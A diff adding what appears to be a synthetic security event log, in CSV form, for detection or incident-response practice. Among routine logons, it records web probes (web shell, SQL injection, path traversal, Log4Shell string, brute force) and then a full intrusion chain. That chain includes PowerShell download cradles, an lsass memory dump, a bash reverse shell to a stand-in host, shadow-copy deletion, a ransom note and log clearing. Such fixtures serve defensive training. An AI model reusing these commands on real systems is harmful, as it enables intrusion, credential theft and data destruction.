@@ -1,0 +1,75 @@
+timestamp,event_id,user,source_ip,host,message
+2026-10-20 03:12:00,4624,jsmith,198.51.100.7,SRV01,An account was successfully logged on
+2026-10-20 08:05:20,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 08:18:09,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 08:31:25,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 08:44:41,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 08:57:03,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 09:10:04,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 09:23:52,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 09:30:12,4688,alice,10.0.0.11,WS01,A new process was created: chrome.exe
+2026-10-20 09:36:34,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 09:49:06,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 10:02:23,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 10:15:37,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 10:15:40,4688,bob,10.0.0.12,WS02,A new process was created: excel.exe
+2026-10-20 10:28:03,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 10:41:58,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 10:54:32,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 11:02:09,4688,carol,10.0.0.13,WS03,A new process was created: notepad.exe
+2026-10-20 11:07:13,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 11:20:02,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 11:33:05,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 11:46:27,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 11:59:26,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 12:12:04,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 12:25:15,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 12:38:05,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 12:44:31,4688,dave,10.0.0.14,DB01,A new process was created: sqlservr.exe
+2026-10-20 12:51:35,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 13:04:27,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 13:17:03,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 13:30:52,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 13:40:05,3000,-,198.51.100.23,WEB01,GET /uploads/shell.php?cmd=whoami HTTP/1.1 200 UA=Mozilla/5.0
+2026-10-20 13:41:10,3000,-,198.51.100.23,WEB01,"GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1 200 UA=sqlmap/1.7"
+2026-10-20 13:42:22,3000,-,198.51.100.23,WEB01,GET /download?file=../../../../etc/passwd HTTP/1.1 404 UA=Nmap Scripting Engine
+2026-10-20 13:43:30,3000,-,198.51.100.23,WEB01,GET / HTTP/1.1 200 X-Api-Version=${jndi:ldap://198.51.100.99/x}
+2026-10-20 13:43:36,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 13:44:41,3000,-,198.51.100.23,WEB01,POST /login HTTP/1.1 401 UA=Hydra v9.4
+2026-10-20 13:56:07,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 14:05:00,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:05,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:10,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:15,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:20,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:25,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:30,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:35,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:40,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:45,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:50,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:05:55,4625,admin,203.0.113.50,SRV01,An account failed to log on
+2026-10-20 14:06:10,4624,admin,203.0.113.50,SRV01,An account was successfully logged on
+2026-10-20 14:08:00,4688,admin,203.0.113.50,SRV01,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+2026-10-20 14:09:00,4688,admin,203.0.113.50,SRV01,powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.99/a.ps1')
+2026-10-20 14:09:14,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 14:10:00,4688,admin,203.0.113.50,SRV01,certutil.exe -urlcache -split -f http://198.51.100.99/p.bin p.bin
+2026-10-20 14:12:00,4688,admin,203.0.113.50,SRV01,procdump.exe -ma lsass.exe lsass.dmp
+2026-10-20 14:15:00,4720,admin,203.0.113.50,SRV01,A user account was created
+2026-10-20 14:16:00,4732,admin,203.0.113.50,SRV01,A member was added to the Administrators group
+2026-10-20 14:18:00,7045,admin,203.0.113.50,SRV01,A service was installed in the system: UpdaterSvc
+2026-10-20 14:20:00,4688,admin,203.0.113.50,SRV01,vssadmin delete shadows /all /quiet
+2026-10-20 14:21:00,4688,admin,203.0.113.50,WEB01,bash -i >& /dev/tcp/198.51.100.99/4444 0>&1
+2026-10-20 14:22:40,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 14:25:00,3000,admin,203.0.113.50,SRV01,README.txt: Your files have been encrypted. Send bitcoin to recover them
+2026-10-20 14:30:00,1102,admin,203.0.113.50,SRV01,The audit log was cleared
+2026-10-20 14:35:40,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 14:48:37,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 15:01:03,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 15:14:36,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 15:27:37,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 15:40:25,4624,dave,10.0.0.14,DB01,An account was successfully logged on
+2026-10-20 15:53:03,4624,alice,10.0.0.11,WS01,An account was successfully logged on
+2026-10-20 16:06:14,4624,bob,10.0.0.12,WS02,An account was successfully logged on
+2026-10-20 16:19:02,4624,carol,10.0.0.13,WS03,An account was successfully logged on
+2026-10-20 16:32:35,4624,dave,10.0.0.14,DB01,An account was successfully logged on
